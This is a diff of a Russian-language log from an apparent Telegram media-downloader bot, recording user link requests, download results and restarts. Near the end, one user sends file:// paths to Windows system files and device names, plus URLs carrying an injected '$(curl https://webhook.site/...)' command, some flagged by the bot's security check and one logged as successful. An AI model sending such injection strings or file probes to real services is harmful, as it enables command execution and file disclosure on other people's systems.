@@ -1,214 +1,34 @@
-2025-11-25T03:12:45.625589 | SYSTEM |  | Система запущена (Clean Start).
-2025-11-25T03:13:28.263212 | USER_REQ | user:spamtest(1234567) | https://www.tiktok.com/@user/video/12345
-2025-11-25T03:13:28.266392 | USER_REQ | user:spamtest(1234567) | <https://www.tiktok.com/@user/video/12345>
-2025-11-25T03:13:28.430806 | USER_REQ | user:spamtest(1234567) | https://www.tiktok.com/@user/video/12345
-2025-11-25T03:13:28.431833 | USER_REQ | user:spamtest(1234567) | <https://www.tiktok.com/@user/video/12345>
-2025-11-25T03:13:28.585475 | USER_REQ | user:spamtest(1234567) | https://www.tiktok.com/@user/video/12345
-2025-11-25T03:13:28.737451 | USER_REQ | user:spamtest(1234567) | https://www.tiktok.com/@user/video/12345
-2025-11-25T03:13:28.907651 | USER_REQ | user:spamtest(1234567) | https://www.tiktok.com/@user/video/12345
-2025-11-25T03:13:29.059925 | USER_REQ | user:spamtest(1234567) | https://www.tiktok.com/@user/video/12345
-2025-11-25T03:14:59.401288 | SYSTEM |  | Система остановлена.
-2025-11-25T03:15:04.996423 | SYSTEM |  | Система запущена (Clean Start).
-2025-11-25T03:15:12.570720 | USER_REQ | user:ch4rov(708208281) | <https://vm.tiktok.com/ZMAgLGm4D/>
-2025-11-25T03:15:12.571728 | USER_REQ | user:ch4rov(708208281) | <<https://vm.tiktok.com/ZMAgLGm4D/>>
-2025-11-25T03:15:17.870283 | SUCCESS | user:ch4rov(708208281) | Успешно (<https://vm.tiktok.com/ZMAgLGm4D/>)
-2025-11-25T03:15:17.871266 | SUCCESS | user:ch4rov(708208281) | Успешно (<<https://vm.tiktok.com/ZMAgLGm4D/>>)
-2025-11-25T03:17:26.566375 | USER_REQ | user:ch4rov(708208281) | <https://www.instagram.com/reel/DO8cOccDC-d/?igsh=eXRpbHJvYmFvZXlv>
-2025-11-25T03:17:26.567377 | USER_REQ | user:ch4rov(708208281) | <https://www.instagram.com/reel/DO8cOccDC-d/?igsh=eXRpbHJvYmFvZXlv>
-2025-11-25T03:17:30.620253 | FAIL | user:ch4rov(708208281) | Download Fail (Не удалось скачать файлы.)
-2025-11-25T03:17:30.620990 | FAIL | user:ch4rov(708208281) | Download Fail (Не удалось скачать файлы.)
-2025-11-25T03:17:45.250703 | USER_REQ | user:ch4rov(708208281) | <https://www.instagram.com/reel/DRSBP_ViBbF/?igsh=bnBtanU5aHJycDZl>
-2025-11-25T03:17:45.251743 | USER_REQ | user:ch4rov(708208281) | <https://www.instagram.com/reel/DRSBP_ViBbF/?igsh=bnBtanU5aHJycDZl>
-2025-11-25T03:17:48.305338 | FAIL | user:ch4rov(708208281) | Download Fail (Не удалось скачать файлы.)
-2025-11-25T03:17:48.305338 | FAIL | user:ch4rov(708208281) | Download Fail (Не удалось скачать файлы.)
-2025-11-25T03:20:25.530066 | USER_REQ | user:ch4rov(708208281) | <https://vm.tiktok.com/ZMAwhgC49/>
-2025-11-25T03:20:25.530301 | USER_REQ | user:ch4rov(708208281) | <<https://vm.tiktok.com/ZMAwhgC49/>>
-2025-11-25T03:20:33.138650 | SUCCESS | user:ch4rov(708208281) | Успешно (<https://vm.tiktok.com/ZMAwhgC49/>)
-2025-11-25T03:20:33.139117 | SUCCESS | user:ch4rov(708208281) | Успешно (<<https://vm.tiktok.com/ZMAwhgC49/>>)
-2025-11-25T03:23:50.512629 | SYSTEM |  | Система остановлена.
-2025-11-25T03:23:56.685004 | SYSTEM |  | Система запущена (Clean Start).
-2025-11-25T03:25:57.447685 | USER_REQ | user:ch4rov(708208281) | <https://youtube.com/shorts/_sn6sRuwwU4?si=2WtizZq30c5fCKFe>
-2025-11-25T03:25:57.448344 | USER_REQ | user:ch4rov(708208281) | <https://youtube.com/shorts/_sn6sRuwwU4?si=2WtizZq30c5fCKFe>
-2025-11-25T03:26:00.722911 | FAIL | user:ch4rov(708208281) | Download Fail (Не удалось скачать файлы.)
-2025-11-25T03:26:00.723911 | FAIL | user:ch4rov(708208281) | Download Fail (Не удалось скачать файлы.)
-2025-11-25T03:26:29.766846 | SYSTEM |  | Система остановлена.
-2025-11-25T03:26:35.471004 | SYSTEM |  | Система запущена (Clean Start).
-2025-11-25T03:26:45.655569 | USER_REQ | user:zabka9(8313125348) | <https://vm.tiktok.com/ZMAwhRdAn/>
-2025-11-25T03:26:45.655569 | USER_REQ | user:zabka9(8313125348) | <<https://vm.tiktok.com/ZMAwhRdAn/>>
-2025-11-25T03:26:49.213251 | FAIL | user:zabka9(8313125348) | Download Fail (Не удалось скачать файлы.)
-2025-11-25T03:26:49.214175 | FAIL | user:zabka9(8313125348) | Download Fail (Не удалось скачать файлы.)
-2025-11-25T03:27:14.882066 | USER_REQ | user:zabka9(8313125348) | <https://www.instagram.com/reel/DO8YQgpjM33/?igsh=MXczNXZtZmtvN2VkcA==>
-2025-11-25T03:27:14.883071 | USER_REQ | user:zabka9(8313125348) | <https://www.instagram.com/reel/DO8YQgpjM33/?igsh=MXczNXZtZmtvN2VkcA==>
-2025-11-25T03:27:21.571420 | SUCCESS | user:zabka9(8313125348) | Успешно (<https://www.instagram.com/reel/DO8YQgpjM33/?igsh=MXczNXZtZmtvN2VkcA==>)
-2025-11-25T03:27:21.572419 | SUCCESS | user:zabka9(8313125348) | Успешно (<https://www.instagram.com/reel/DO8YQgpjM33/?igsh=MXczNXZtZmtvN2VkcA==>)
-2025-11-25T03:29:26.690372 | SYSTEM |  | Система остановлена.
-2025-11-25T03:30:20.932537 | SYSTEM |  | Система запущена (Clean Start).
-2025-11-25T03:30:24.621160 | USER_REQ | user:zabka9(8313125348) | <https://vm.tiktok.com/ZMAwhRdAn/>
-2025-11-25T03:30:24.621160 | USER_REQ | user:zabka9(8313125348) | <<https://vm.tiktok.com/ZMAwhRdAn/>>
-2025-11-25T03:30:30.892275 | FAIL | user:zabka9(8313125348) | Download Fail (Не удалось скачать файлы.)
-2025-11-25T03:30:30.893311 | FAIL | user:zabka9(8313125348) | Download Fail (Не удалось скачать файлы.)
-2025-11-25T03:32:13.728783 | SYSTEM |  | Система остановлена.
-2025-11-25T03:32:18.581291 | SYSTEM |  | Система запущена (Clean Start).
-2025-11-25T03:32:38.008660 | USER_REQ | user:ch4rov(708208281) | <https://vm.tiktok.com/ZMAwhXDAj/>
-2025-11-25T03:32:38.009662 | USER_REQ | user:ch4rov(708208281) | <<https://vm.tiktok.com/ZMAwhXDAj/>>
-2025-11-25T03:34:25.538648 | USER_REQ | user:ch4rov(708208281) | <https://www.instagram.com/reel/DNQMnTAsR2k/?igsh=dzBranVrYWloM29i>
-2025-11-25T03:34:25.539650 | USER_REQ | user:ch4rov(708208281) | <https://www.instagram.com/reel/DNQMnTAsR2k/?igsh=dzBranVrYWloM29i>
-2025-11-25T03:35:44.993827 | USER_REQ | user:ch4rov(708208281) | <https://www.twitch.tv/ch4rov/clip/SmokyDirtyBobaResidentSleeper-geWW-E5kg0Tp-vs8?filter=clips&range=all&sort=time>
-2025-11-25T03:35:44.994829 | USER_REQ | user:ch4rov(708208281) | <https://www.twitch.tv/ch4rov/clip/SmokyDirtyBobaResidentSleeper-geWW-E5kg0Tp-vs8?filter=clips&range=all&sort=time>
-2025-11-25T03:35:50.545211 | SYSTEM |  | Система остановлена.
-2025-11-25T03:35:55.620156 | SYSTEM |  | Система запущена (Clean Start).
-2025-11-25T03:35:57.454024 | USER_REQ | user:ch4rov(708208281) | <https://www.twitch.tv/ch4rov/clip/SmokyDirtyBobaResidentSleeper-geWW-E5kg0Tp-vs8?filter=clips&range=all&sort=time>
-2025-11-25T03:35:57.455054 | USER_REQ | user:ch4rov(708208281) | <https://www.twitch.tv/ch4rov/clip/SmokyDirtyBobaResidentSleeper-geWW-E5kg0Tp-vs8?filter=clips&range=all&sort=time>
-2025-11-25T03:36:48.619047 | USER_REQ | user:ch4rov(708208281) | <https://soundcloud.com/ocqbbed9ek3i/yaryy-tolko-ne-begi?si=254dcae5aae141b8951a74c1c8134204&utm_source=clipboard&utm_medium=text&utm_campaign=social_sharing>
-2025-11-25T03:36:48.619283 | USER_REQ | user:ch4rov(708208281) | <https://soundcloud.com/ocqbbed9ek3i/yaryy-tolko-ne-begi?si=254dcae5aae141b8951a74c1c8134204&utm_source=clipboard&utm_medium=text&utm_campaign=social_sharing>
-2025-11-25T03:40:21.730653 | USER_REQ | user:ch4rov(708208281) | <https://vm.tiktok.com/ZMAwhPq1f/>
-2025-11-25T03:40:21.730831 | USER_REQ | user:ch4rov(708208281) | <<https://vm.tiktok.com/ZMAwhPq1f/>>
-2025-11-25T03:42:00.703615 | SYSTEM |  | Система остановлена.
-2025-11-25T03:42:08.521426 | SYSTEM |  | Система запущена (Clean Start).
-2025-11-25T03:42:23.776701 | USER_REQ | user:ch4rov(708208281) | <https://vm.tiktok.com/ZMAwhPq1f/>
-2025-11-25T03:42:23.777662 | USER_REQ | user:ch4rov(708208281) | <<https://vm.tiktok.com/ZMAwhPq1f/>>
-2025-11-25T03:42:29.822313 | FAIL | user:ch4rov(708208281) | Download Fail (Не удалось скачать файлы.)
-2025-11-25T03:42:29.823314 | FAIL | user:ch4rov(708208281) | Download Fail (Не удалось скачать файлы.)
-2025-11-25T03:42:39.202598 | USER_REQ | user:ch4rov(708208281) | <https://soundcloud.com/ocqbbed9ek3i/yaryy-tolko-ne-begi?si=254dcae5aae141b8951a74c1c8134204&utm_source=clipboard&utm_medium=text&utm_campaign=social_sharing>
-2025-11-25T03:42:39.203505 | USER_REQ | user:ch4rov(708208281) | <https://soundcloud.com/ocqbbed9ek3i/yaryy-tolko-ne-begi?si=254dcae5aae141b8951a74c1c8134204&utm_source=clipboard&utm_medium=text&utm_campaign=social_sharing>
-2025-11-25T03:42:45.099643 | SUCCESS | user:ch4rov(708208281) | Успешно (<https://soundcloud.com/ocqbbed9ek3i/yaryy-tolko-ne-begi?si=254dcae5aae141b8951a74c1c8134204&utm_source=clipboard&utm_medium=text&utm_campaign=social_sharing>)
-2025-11-25T03:42:45.100680 | SUCCESS | user:ch4rov(708208281) | Успешно (<https://soundcloud.com/ocqbbed9ek3i/yaryy-tolko-ne-begi?si=254dcae5aae141b8951a74c1c8134204&utm_source=clipboard&utm_medium=text&utm_campaign=social_sharing>)
-2025-11-25T03:42:52.595681 | SUCCESS | user:ch4rov(708208281) | [КЭШ] Успешно (<https://soundcloud.com/ocqbbed9ek3i/yaryy-tolko-ne-begi?si=254dcae5aae141b8951a74c1c8134204&utm_source=clipboard&utm_medium=text&utm_campaign=social_sharing>)
-2025-11-25T03:42:52.595681 | SUCCESS | user:ch4rov(708208281) | [КЭШ] Успешно (<https://soundcloud.com/ocqbbed9ek3i/yaryy-tolko-ne-begi?si=254dcae5aae141b8951a74c1c8134204&utm_source=clipboard&utm_medium=text&utm_campaign=social_sharing>)
-2025-11-25T03:51:17.439799 | SYSTEM |  | Система запущена (Clean Start).
-2025-11-25T03:51:47.707291 | SYSTEM |  | Система остановлена.
-2025-11-25T03:52:27.303957 | SYSTEM |  | Система запущена (Clean Start).
-2025-11-25T03:53:41.536024 | USER_REQ | user:ch4rov(708208281) | <https://vm.tiktok.com/ZMAwhPq1f/>
-2025-11-25T03:53:41.537023 | USER_REQ | user:ch4rov(708208281) | <<https://vm.tiktok.com/ZMAwhPq1f/>>
-2025-11-25T03:53:50.120088 | FAIL | user:ch4rov(708208281) | Download Fail (Не удалось скачать файлы.)
-2025-11-25T03:53:50.120088 | FAIL | user:ch4rov(708208281) | Download Fail (Не удалось скачать файлы.)
-2025-11-25T03:54:31.898775 | SYSTEM |  | Система остановлена.
-2025-11-25T03:54:59.100806 | SYSTEM |  | Система запущена (Clean Start).
-2025-11-25T03:55:19.185760 | SYSTEM |  | Система остановлена.
-2025-11-25T03:56:04.779997 | SYSTEM |  | Система запущена (Clean Start).
-2025-11-25T03:56:19.332663 | USER_REQ | user:ch4rov(708208281) | <https://soundcloud.com/ocqbbed9ek3i/yaryy-tolko-ne-begi?si=254dcae5aae141b8951a74c1c8134204&utm_source=clipboard&utm_medium=text&utm_campaign=social_sharing>
-2025-11-25T03:56:19.333662 | USER_REQ | user:ch4rov(708208281) | <https://soundcloud.com/ocqbbed9ek3i/yaryy-tolko-ne-begi?si=254dcae5aae141b8951a74c1c8134204&utm_source=clipboard&utm_medium=text&utm_campaign=social_sharing>
-2025-11-25T03:56:26.008607 | SUCCESS | user:ch4rov(708208281) | Успешно (<https://soundcloud.com/ocqbbed9ek3i/yaryy-tolko-ne-begi?si=254dcae5aae141b8951a74c1c8134204&utm_source=clipboard&utm_medium=text&utm_campaign=social_sharing>)
-2025-11-25T03:56:26.009588 | SUCCESS | user:ch4rov(708208281) | Успешно (<https://soundcloud.com/ocqbbed9ek3i/yaryy-tolko-ne-begi?si=254dcae5aae141b8951a74c1c8134204&utm_source=clipboard&utm_medium=text&utm_campaign=social_sharing>)
-2025-11-25T03:57:11.486437 | USER_REQ | user:ch4rov(708208281) | <https://www.instagram.com/reel/DRbyoFWCP0M/?igsh=YWx3emowNGI2a2Js>
-2025-11-25T03:57:11.487452 | USER_REQ | user:ch4rov(708208281) | <https://www.instagram.com/reel/DRbyoFWCP0M/?igsh=YWx3emowNGI2a2Js>
-2025-11-25T03:57:17.341971 | SUCCESS | user:ch4rov(708208281) | Успешно (<https://www.instagram.com/reel/DRbyoFWCP0M/?igsh=YWx3emowNGI2a2Js>)
-2025-11-25T03:57:17.342526 | SUCCESS | user:ch4rov(708208281) | Успешно (<https://www.instagram.com/reel/DRbyoFWCP0M/?igsh=YWx3emowNGI2a2Js>)
-2025-11-25T03:57:28.565950 | SUCCESS | user:ch4rov(708208281) | [КЭШ] Успешно (<https://www.instagram.com/reel/DRbyoFWCP0M/?igsh=YWx3emowNGI2a2Js>)
-2025-11-25T03:57:28.566924 | SUCCESS | user:ch4rov(708208281) | [КЭШ] Успешно (<https://www.instagram.com/reel/DRbyoFWCP0M/?igsh=YWx3emowNGI2a2Js>)
-2025-11-25T03:58:56.490845 | SYSTEM |  | Система остановлена.
-2025-11-25T03:59:01.210359 | SYSTEM |  | Система запущена (Clean Start).
-2025-11-25T03:59:04.327440 | USER_REQ | user:ch4rov(708208281) | <https://www.instagram.com/reel/DRbyoFWCP0M/?igsh=YWx3emowNGI2a2Js>
-2025-11-25T03:59:04.328404 | USER_REQ | user:ch4rov(708208281) | <https://www.instagram.com/reel/DRbyoFWCP0M/?igsh=YWx3emowNGI2a2Js>
-2025-11-25T03:59:10.510864 | SUCCESS | user:ch4rov(708208281) | Успешно (<https://www.instagram.com/reel/DRbyoFWCP0M/?igsh=YWx3emowNGI2a2Js>)
-2025-11-25T03:59:10.511777 | SUCCESS | user:ch4rov(708208281) | Успешно (<https://www.instagram.com/reel/DRbyoFWCP0M/?igsh=YWx3emowNGI2a2Js>)
-2025-11-25T04:00:35.157690 | SYSTEM |  | Система остановлена.
-2025-11-25T04:00:40.304802 | SYSTEM |  | Система запущена (Clean Start).
-2025-11-25T04:00:42.728617 | USER_REQ | user:ch4rov(708208281) | <https://www.instagram.com/reel/DRbyoFWCP0M/?igsh=YWx3emowNGI2a2Js>
-2025-11-25T04:00:42.729658 | USER_REQ | user:ch4rov(708208281) | <https://www.instagram.com/reel/DRbyoFWCP0M/?igsh=YWx3emowNGI2a2Js>
-2025-11-25T04:00:49.053002 | SUCCESS | user:ch4rov(708208281) | Успешно (<https://www.instagram.com/reel/DRbyoFWCP0M/?igsh=YWx3emowNGI2a2Js>)
-2025-11-25T04:00:49.054003 | SUCCESS | user:ch4rov(708208281) | Успешно (<https://www.instagram.com/reel/DRbyoFWCP0M/?igsh=YWx3emowNGI2a2Js>)
-2025-11-25T04:01:22.010926 | SYSTEM |  | Система остановлена.
-2025-11-25T04:01:47.541220 | SYSTEM |  | Система запущена (Clean Start).
-2025-11-25T04:01:49.685359 | USER_REQ | user:ch4rov(708208281) | <https://www.instagram.com/reel/DRbyoFWCP0M/?igsh=YWx3emowNGI2a2Js>
-2025-11-25T04:01:49.686359 | USER_REQ | user:ch4rov(708208281) | <https://www.instagram.com/reel/DRbyoFWCP0M/?igsh=YWx3emowNGI2a2Js>
-2025-11-25T04:01:55.741245 | SUCCESS | user:ch4rov(708208281) | Успешно (<https://www.instagram.com/reel/DRbyoFWCP0M/?igsh=YWx3emowNGI2a2Js>)
-2025-11-25T04:01:55.742171 | SUCCESS | user:ch4rov(708208281) | Успешно (<https://www.instagram.com/reel/DRbyoFWCP0M/?igsh=YWx3emowNGI2a2Js>)
-2025-11-25T04:03:35.812459 | SYSTEM |  | Система остановлена.
-2025-11-25T04:03:40.472257 | SYSTEM |  | Система запущена (Clean Start).
-2025-11-25T04:03:43.089196 | USER_REQ | user:ch4rov(708208281) | <https://www.instagram.com/reel/DRbyoFWCP0M/?igsh=YWx3emowNGI2a2Js>
-2025-11-25T04:03:49.223663 | SUCCESS | user:ch4rov(708208281) | Успешно (<https://www.instagram.com/reel/DRbyoFWCP0M/?igsh=YWx3emowNGI2a2Js>)
-2025-11-25T04:05:28.677782 | SYSTEM |  | Система остановлена.
-2025-11-25T04:06:27.972466 | SYSTEM |  | Система запущена (Clean Start).
-2025-11-25T04:06:50.266753 | USER_REQ | user:ch4rov(708208281) | <https://www.instagram.com/reel/DRbyoFWCP0M/?igsh=YWx3emowNGI2a2Js>
-2025-11-25T04:06:56.439879 | SUCCESS | user:ch4rov(708208281) | Успешно (<https://www.instagram.com/reel/DRbyoFWCP0M/?igsh=YWx3emowNGI2a2Js>)
-2025-11-25T04:10:49.542614 | USER_REQ | user:ch4rov(708208281) | <https://www.instagram.com/reel/DPcLo19CGLO/?igsh=YWhva3Rvb2MyenUz>
-2025-11-25T04:10:54.822617 | SUCCESS | user:ch4rov(708208281) | Успешно (<https://www.instagram.com/reel/DPcLo19CGLO/?igsh=YWhva3Rvb2MyenUz>)
-2025-11-25T04:11:26.132971 | SYSTEM |  | Система остановлена.
-2025-11-25T04:11:32.573011 | SYSTEM |  | Система запущена (Clean Start).
-2025-11-25T04:11:39.380340 | OTHER_MSG | user:ch4rov(708208281) | чмоооо
-2025-11-25T04:11:48.678855 | OTHER_MSG | user:ch4rov(708208281) | о норм
-2025-11-25T04:12:36.686785 | SYSTEM |  | Система остановлена.
-2025-11-25T04:29:23.458198 | SYSTEM |  | Система запущена (Clean Start).
-2025-11-25T04:31:42.313251 | SYSTEM |  | Система остановлена.
-2025-11-25T04:31:48.637375 | SYSTEM |  | Система запущена (Clean Start).
-2025-11-25T04:32:12.271095 | FAIL | user:ch4rov(708208281) | Inline Download Fail (Не удалось скачать файлы.)
-2025-11-25T04:33:02.730637 | FAIL | user:ch4rov(708208281) | Inline Download Fail (Не удалось скачать файлы.)
-2025-11-25T04:39:02.183711 | SYSTEM |  | Система остановлена.
-2025-11-25T04:39:24.524160 | SYSTEM |  | Система запущена (Clean Start).
-2025-11-25T04:40:55.870391 | SYSTEM |  | Система остановлена.
-2025-11-25T04:41:01.889069 | SYSTEM |  | Система запущена (Clean Start).
-2025-11-25T04:42:39.913634 | SYSTEM |  | Система остановлена.
-2025-11-25T04:44:00.538111 | SYSTEM |  | Система запущена (Clean Start).
-2025-11-25T04:44:12.491177 | SYSTEM |  | Система остановлена.
-2025-11-25T04:44:44.103271 | SYSTEM |  | Система запущена (Clean Start).
-2025-11-25T04:47:54.280109 | SYSTEM |  | Система остановлена.
-2025-11-25T04:48:05.417508 | SYSTEM |  | Система запущена (Clean Start).
-2025-11-25T04:50:24.617494 | SYSTEM |  | Система остановлена.
-2025-11-25T04:50:53.210209 | SYSTEM |  | Система запущена (Clean Start).
-2025-11-25T04:51:34.750340 | SYSTEM |  | Система остановлена.
-2025-11-25T04:51:40.908711 | SYSTEM |  | Система запущена (Clean Start).
-2025-11-25T04:54:40.759265 | SYSTEM |  | Система остановлена.
-2025-11-25T04:55:40.004290 | SYSTEM |  | Система запущена (Clean Start).
-2025-11-25T04:56:09.513788 | USER_REQ | user:ch4rov(708208281) | <https://www.instagram.com/reel/DPD8liwDBP6/?igsh=MjJnZTlhcDVybTdu>
-2025-11-25T04:56:15.223735 | SUCCESS | user:ch4rov(708208281) | Успешно (<https://www.instagram.com/reel/DPD8liwDBP6/?igsh=MjJnZTlhcDVybTdu>)
-2025-11-25T04:56:30.171815 | SYSTEM |  | Система остановлена.
-2025-11-25T04:56:37.387897 | SYSTEM |  | Система запущена (Clean Start).
-2025-11-25T04:56:43.325228 | USER_REQ | user:ch4rov(708208281) | <https://www.instagram.com/reel/DPD8liwDBP6/?igsh=MjJnZTlhcDVybTdu>
-2025-11-25T04:56:48.176682 | SUCCESS | user:ch4rov(708208281) | Успешно (<https://www.instagram.com/reel/DPD8liwDBP6/?igsh=MjJnZTlhcDVybTdu>)
-2025-11-25T04:58:35.447993 | SYSTEM |  | Система остановлена.
-2025-11-25T04:59:01.896826 | SYSTEM |  | Система запущена (Clean Start).
-2025-11-25T05:10:02.116949 | SYSTEM |  | Система остановлена.
-2025-11-25T05:10:10.690519 | SYSTEM |  | Система запущена (Clean Start).
-2025-11-25T05:11:28.908551 | OTHER_MSG | user:ch4rov(708208281) | 13
-2025-11-25T05:16:36.371395 | USER_REQ | user:ch4rov(708208281) | <https://www.youtube.com/shorts/IdhylYGXCUw>
-2025-11-25T05:16:47.711911 | SUCCESS | user:ch4rov(708208281) | Успешно (<https://www.youtube.com/shorts/IdhylYGXCUw>)
-2025-11-25T05:17:30.694061 | USER_REQ | user:ch4rov(708208281) | <https://www.youtube.com/watch?v=6zTCpJ_nuwM&list=RD6zTCpJ_nuwM&start_radio=1>
-2025-11-25T05:17:41.451002 | SUCCESS | user:ch4rov(708208281) | Успешно (<https://www.youtube.com/watch?v=6zTCpJ_nuwM&list=RD6zTCpJ_nuwM&start_radio=1>)
-2025-11-25T05:19:11.467429 | SYSTEM |  | Система остановлена.
-2025-11-25T05:19:18.076276 | SYSTEM |  | Система запущена (Clean Start).
-2025-11-25T05:21:48.570574 | SYSTEM |  | Система остановлена.
-2025-11-25T05:21:54.097502 | SYSTEM |  | Система запущена (Clean Start).
-2025-11-25T05:24:31.353587 | SYSTEM |  | Система остановлена.
-2025-11-25T05:24:37.196740 | SYSTEM |  | Система запущена (Clean Start).
-2025-11-25T05:26:44.274170 | SYSTEM |  | Система остановлена.
-2025-11-25T05:26:50.610797 | SYSTEM |  | Система запущена (Clean Start).
-2025-11-25T05:28:22.103503 | SYSTEM |  | Система остановлена.
-2025-11-25T05:28:29.394597 | SYSTEM |  | Система запущена (Clean Start).
-2025-11-25T05:31:12.300857 | SYSTEM |  | Система остановлена.
-2025-11-25T05:31:18.839678 | SYSTEM |  | Система запущена (Clean Start).
-2025-11-25T05:38:08.475337 | SYSTEM |  | Система остановлена.
-2025-11-25T05:38:14.623459 | SYSTEM |  | Система запущена (Clean Start).
-2025-11-25T05:47:21.496246 | SYSTEM |  | Система остановлена.
-2025-11-25T05:47:28.084817 | SYSTEM |  | Система запущена (Clean Start).
-2025-11-25T05:51:31.081894 | SYSTEM |  | Система остановлена.
-2025-11-25T05:51:37.160678 | SYSTEM |  | Система запущена (Clean Start).
-2025-11-25T05:58:35.762972 | SYSTEM |  | Система остановлена.
-2025-11-25T05:58:41.628432 | SYSTEM |  | Система запущена (Clean Start).
-2025-11-25T06:01:35.470984 | SYSTEM |  | Система остановлена.
-2025-11-25T06:01:41.545981 | SYSTEM |  | Система запущена (Clean Start).
-2025-11-25T06:03:56.864144 | SYSTEM |  | Система остановлена.
-2025-11-25T06:04:03.047620 | SYSTEM |  | Система запущена (Clean Start).
-2025-11-25T06:06:25.162346 | SYSTEM |  | Система остановлена.
-2025-11-25T06:06:31.363435 | SYSTEM |  | Система запущена (Clean Start).
-2025-11-25T06:08:34.662638 | SYSTEM |  | Система остановлена.
-2025-11-25T06:09:56.378897 | SYSTEM |  | Система запущена (Clean Start).
-2025-11-25T06:10:05.811738 | SYSTEM |  | Система остановлена.
-2025-11-25T06:10:11.256850 | SYSTEM |  | Система запущена (Clean Start).
-2025-11-25T06:12:11.223927 | SYSTEM |  | Система остановлена.
-2025-11-25T06:12:16.694103 | SYSTEM |  | Система запущена (Clean Start).
-2025-11-25T06:27:40.361010 | SYSTEM |  | Система остановлена.
-2025-11-25T06:29:32.305114 | SYSTEM |  | Система запущена (Clean Start).
-2025-11-25T06:38:11.223666 | SYSTEM |  | Система остановлена.
-2025-11-25T06:38:17.224490 | SYSTEM |  | Система запущена (Clean Start).
-2025-11-25T06:40:10.936470 | NEW_USER | user:Ksusheczka(6773785373) | Новый пользователь: Ksusheczka (ID: 6773785373)
-2025-11-25T06:41:42.924470 | SYSTEM |  | Система остановлена.
-2025-11-25T06:41:49.585195 | SYSTEM |  | Система запущена (Clean Start).
-2025-11-25T06:44:04.286024 | SYSTEM |  | Система остановлена.
-2025-11-25T06:44:10.531622 | SYSTEM |  | Система запущена (Clean Start).
-2025-11-25T06:47:55.187446 | SYSTEM |  | Система остановлена.
-2025-11-25T06:48:01.544726 | SYSTEM |  | Система запущена (Clean Start).
-2025-11-25T07:07:36.253200 | SYSTEM |  | Система остановлена.
-2025-11-25T07:07:42.321960 | SYSTEM |  | Система запущена (Clean Start).
-2025-11-25T07:08:21.019954 | ADMIN | admin:ch4rov(708208281) | Отправил сообщение 6773785373: ЖЕЛАЮ ПРИЯТНОГО УТРА И ХОРОШЕГО ДНЯ =)
-2025-11-25T07:26:59.927543 | SYSTEM |  | Система остановлена.
+2025-11-25T07:52:40.680932 | SYSTEM |  | Система запущена (Clean Start).
+2025-11-25T07:52:58.257346 | INFO | user:zabka9(8313125348) | Пользователь разблокировал бота 🟢
+2025-11-25T07:53:13.437252 | INFO | user:zabka9(8313125348) | Пользователь заблокировал бота ⛔
+2025-11-25T07:53:39.431854 | INFO | user:zabka9(8313125348) | Пользователь разблокировал бота 🟢
+2025-11-25T10:11:06.266254 | OTHER_MSG | user:Donmu(491743989) | file:///C:/Windows/System32/drivers/etc/hosts
+2025-11-25T10:12:52.873043 | OTHER_MSG | user:Donmu(491743989) | file:///C:/Users/Administrator/Desktop/hui
+2025-11-25T10:15:19.470279 | OTHER_MSG | user:Donmu(491743989) | file:////test/video.mp4
+2025-11-25T10:15:47.166007 | OTHER_MSG | user:Donmu(491743989) | file:///C:/Users/charov/Desktop/
+2025-11-25T10:16:06.678485 | OTHER_MSG | user:Donmu(491743989) | file:///CON
+2025-11-25T10:16:09.210294 | OTHER_MSG | user:Donmu(491743989) | file:///CON
+2025-11-25T10:16:12.926761 | OTHER_MSG | user:Donmu(491743989) | file:///CON
+2025-11-25T10:16:20.052314 | OTHER_MSG | user:Donmu(491743989) | file:///aux
+2025-11-25T10:16:24.327613 | OTHER_MSG | user:Donmu(491743989) | file:///aux
+2025-11-25T10:17:32.066825 | OTHER_MSG | user:Donmu(491743989) | file:///C:/Windows/Media/Alarm01.wav
+2025-11-25T10:17:40.983544 | OTHER_MSG | user:Donmu(491743989) | file:///C:/Windows/Media/chimes.wav
+2025-11-25T10:17:57.379969 | OTHER_MSG | user:Donmu(491743989) | file:///C:/Windows/System32/drivers/etc/hosts
+2025-11-25T10:18:30.297493 | OTHER_MSG | user:Donmu(491743989) | file:///C:/Windows/System32/drivers/etc/hosts
+2025-11-25T10:18:35.429085 | OTHER_MSG | user:Donmu(491743989) | file:///C:/Users/Administrator/Desktop/hui
+2025-11-25T10:18:40.984092 | OTHER_MSG | user:Donmu(491743989) | file:////test/video.mp4
+2025-11-25T10:18:50.415723 | OTHER_MSG | user:Donmu(491743989) | file:///C:/Users/charov/Desktop/hui
+2025-11-25T10:18:55.077361 | OTHER_MSG | user:Donmu(491743989) | file:///CON
+2025-11-25T10:18:59.930703 | OTHER_MSG | user:Donmu(491743989) | file:///aux
+2025-11-25T10:19:58.857754 | USER_REQ | user:Donmu(491743989) | <https://www.instagram.com/reel/DRUOgo_CBG3/?igsh=NTc4MTIwNjQ2YQ==>
+2025-11-25T10:20:07.098698 | SUCCESS | user:Donmu(491743989) | Успешно (<https://www.instagram.com/reel/DRUOgo_CBG3/?igsh=NTc4MTIwNjQ2YQ==>)
+2025-11-25T10:21:48.727125 | SECURITY | user:Donmu(491743989) | прислал запрещенную ссылку: <ls -l /tmp/;https://youtu.be/2Hs-gIqYSm4;+$(curl https://webhook.site/53094069-806b-4bb9-9bfd-32679f36aa62)>
+2025-11-25T10:22:18.109669 | SECURITY | user:Donmu(491743989) | прислал запрещенную ссылку: <Https://youtu.be/2Hs-gIqYSm4;+$(curl https://webhook.site/53094069-806b-4bb9-9bfd-32679f36aa62)>
+2025-11-25T10:22:32.011695 | USER_REQ | user:Donmu(491743989) | <https://youtu.be/2Hs-gIqYSm4;+$(curl https://webhook.site/53094069-806b-4bb9-9bfd-32679f36aa62)>
+2025-11-25T10:22:50.470842 | SUCCESS | user:Donmu(491743989) | Успешно (<https://youtu.be/2Hs-gIqYSm4;+$(curl https://webhook.site/53094069-806b-4bb9-9bfd-32679f36aa62)>)
+2025-11-25T17:27:58.829637 | USER_REQ | user:ch4rov(708208281) | <https://vm.tiktok.com/ZMAwmLdPv/>
+2025-11-25T17:28:07.018115 | FAIL | user:ch4rov(708208281) | Download Fail (Не удалось скачать файлы.)
+2025-11-25T18:47:14.297373 | SYSTEM |  | Система остановлена.
+2025-11-25T18:47:21.383466 | SYSTEM |  | Система запущена (Clean Start).
+2025-11-25T18:47:34.642358 | USER_REQ | user:ch4rov(708208281) | <https://youtu.be/2Hs-gIqYSm4>
+2025-11-25T18:47:53.625585 | SUCCESS | user:ch4rov(708208281) | Успешно (<https://youtu.be/2Hs-gIqYSm4>)
